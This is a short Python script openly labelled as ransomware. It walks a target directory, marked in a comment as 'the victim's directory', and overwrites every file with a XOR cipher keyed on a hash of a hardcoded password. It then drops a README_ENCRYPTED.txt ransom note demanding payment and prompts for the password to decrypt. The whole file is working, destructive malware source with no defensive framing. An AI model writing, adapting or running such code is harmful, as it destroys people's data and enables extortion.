import os
import hashlib

def encrypt_decrypt_file(filepath, key_hash, encrypt=True):
    try:
        with open(filepath, 'rb') as f:
            file_data = bytearray(f.read())
        key_bytes = bytearray(key_hash.encode())
        key_len = len(key_bytes)
        for i in range(len(file_data)):
            file_data[i] ^= key_bytes[i % key_len]
        with open(filepath, 'wb') as f:
            f.write(file_data)
        return True
    except Exception as e:
        print(f"Error encrypting/decrypting {filepath}: {e}")
        return False

    
def ransomware_attack(target_dir, key_hash):
    try:
        for root, _, files in os.walk(target_dir):
            for file in files:
                filepath = os.path.join(root, file)
                if encrypt_decrypt_file(filepath, key_hash, encrypt=True):
                    print(f"Encrypted: {filepath}")
        return True
    except Exception as e:
        print(f"Ransomware error: {e}")
        return False
    

def display_ransom_note(target_dir):
    ransom_note = "YOUR FILES ARE ENCRYPTED! Pay ransom or lose your data. Ransomeware by frosty contact: blablalbalb"
    note_path = os.path.join(target_dir, "README_ENCRYPTED.txt")
    try:
        with open(note_path, 'w') as f:
            f.write(ransom_note)
        return note_path
    except Exception as e:
        print(f"Error creating ransom note: {e}")
        return None
    
def recovery_mode(target_dir, key_hash):
    try:
        for root, _, files in os.walk(target_dir):
            for file in files:
                filepath = os.path.join(root, file)
                if encrypt_decrypt_file(filepath, key_hash, encrypt=False):
                    print(f"Decrypted: {filepath}")
        print("Recovery complete.")
    except Exception as e:
        print(f"Recovery error: {e}")
        
def main():
    target_dir = "/home/user/"  # Change this to the victim's directory
    if os.geteuid() != 0:
        print("This script requires sudo privileges.")
        return

    password = "secretpassword"
    key_hash = hashlib.sha256(password.encode()).hexdigest()
    if ransomware_attack(target_dir, key_hash):
        display_ransom_note(target_dir)
        user_password = input("Enter password to recover files: ")
        user_key_hash = hashlib.sha256(user_password.encode()).hexdigest()
        if user_key_hash == key_hash:
            recovery_mode(target_dir, key_hash)
        else:
            print("Incorrect password.")